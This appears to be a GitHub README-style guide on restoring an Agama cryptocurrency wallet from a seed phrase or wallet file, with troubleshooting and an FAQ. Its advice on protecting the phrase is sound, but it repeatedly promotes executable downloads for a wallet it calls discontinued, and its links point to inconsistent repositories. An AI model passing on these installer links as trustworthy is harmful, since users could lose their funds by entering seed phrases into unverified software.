[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Restoring an Agama Wallet: Seed, Passphrase and Wallet File

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Restoring an Agama wallet means recreating its keys from the recovery material you kept: a seed phrase for a fresh install, or a wallet file for an install that still has the original data. The phrase is portable across software generations in principle; the file is not. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and its interface uses Restore Wallet, seed phrase and password as the labels for this flow.

## You'll see this if

You are reinstalling, moving to a new machine, or opening a wallet that shows nothing and wondering whether the restore worked.

| What you have | What it restores | What it does not |
|---|---|---|
| Seed phrase | Keys, in software that derives the same addresses | Balances on addresses outside the derived range |
| Wallet file | The specific wallet's data, in software that reads that format | Portability to other wallets |
| Password | Access to an existing encrypted wallet | Recovery of anything, if the phrase is lost |
| Nothing | Nothing |  -  |

## Why it happens

A wallet is a key store, not the keys themselves. The phrase is the master secret from which addresses are derived; the file is a container holding the results plus metadata. Restoring with the phrase asks the software to re-derive; restoring with the file asks it to read.

That difference explains the two failure modes people meet. A phrase restore can succeed and still show an empty balance if the software derives a different address range or follows different derivation rules. A file restore can fail outright if the software generation does not match the file.

There is also a security asymmetry. The phrase is the whole secret, so entering it anywhere is equivalent to handing over the wallet. The file is a copy of the wallet's data, encrypted with the password, and it can be copied without exposing the phrase.

## Fix

Restore in this order, and stop at the first step that produces the right balance.

1. **Install the software you intend to use**, from a source you have verified, and choose Restore Wallet rather than Create New Wallet.
2. **Enter the phrase exactly as recorded**: same words, same order, same spelling, single spaces. The wallet normalises case, but it cannot guess a wrong word.
3. **Set a password you have not used elsewhere.** It encrypts the local store; it is not the phrase and cannot recover it.
4. **Wait for the scan to finish.** A restored wallet derives addresses in sequence and queries the chain; a balance that appears mid-scan is partial.
5. **Compare against a known address.** If you recorded one receiving address, check that it appears in the restored wallet; if it does not, the derivation differs.
6. **Only then consider the file route**, if you still have the original wallet data and software that reads it.

Never type the phrase into a website, a chat, a support form or a "restore checker". Every one of those is a way to lose the wallet, and no legitimate restore happens outside wallet software.

## If that did not work

If the balance is zero but the phrase was accepted, the likely cause is derivation or address range rather than a wrong phrase. [Zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md) separates the cases.

If the wallet rejects the phrase, check word count, order and spelling against your record before assuming corruption. A single transposed word produces a valid phrase for an empty wallet in some schemes, which is worse than a rejection.

If a restored wallet shows a fraction of the expected amount, addresses beyond the scanned range are the usual explanation, and [why a balance is not one number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md) covers what the categories mean.

If the old install will not run at all, the phrase is still the route: restore it into working software rather than repairing a discontinued build.

## Prevention

- **Record the phrase offline, on paper or metal, never in a screenshot.** [Backing up an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md) covers the storage options.
- **Write down one receiving address when you create a wallet.** It is the cheapest restore check there is.
- **Test a restore before you need it.** A restore you have never rehearsed is a hope.
- **Keep the wallet file as a second route, not the only one.** It binds you to a software generation.
- **Never share the phrase to get help.** [Why a seed phrase fails](https://github.com/agama-wallet/agama-wallet/blob/main/why-a-seed-phrase-fails.md) explains the failure modes without asking for one.

## FAQ

### Can I restore an Agama wallet in another wallet?

Only if that wallet derives the same addresses from the same phrase. Some do, some do not, and the difference shows up as an empty balance rather than an error.

### Is the password enough to restore?

No. The password unlocks an existing encrypted store; it cannot recreate keys. Without the phrase or the file, the wallet is gone.

### Does restoring move my funds?

No. Restoring recreates access to addresses that already hold value on the chain. Nothing moves until you send a transaction.

### Can I restore on a machine that is offline?

You can enter the phrase offline, but the balance requires queries to the chain unless you run a node locally. If you restore on a networked machine, do it on one you trust, because the phrase is exposed to anything running there while you type it.

### How long does a restore take?

The derivation is instant; the balance depends on the chain queries and the address range scanned. A restore that shows a partial balance is still working, and closing the wallet mid-scan is how that partial view becomes a wrong belief.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Agama Wallet Backup: What wallet.dat Covers](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md)
- [Agama Wallet Shows Zero Balance: Causes and Checks](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md)
- [Why a Seed Phrase Fails to Restore a Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/why-a-seed-phrase-fails.md)
- [Agama Wallet: What It Is, and Which Agama You Are Looking At](https://github.com/agama-wallet/agama-wallet/blob/main/which-version-you-have.md)
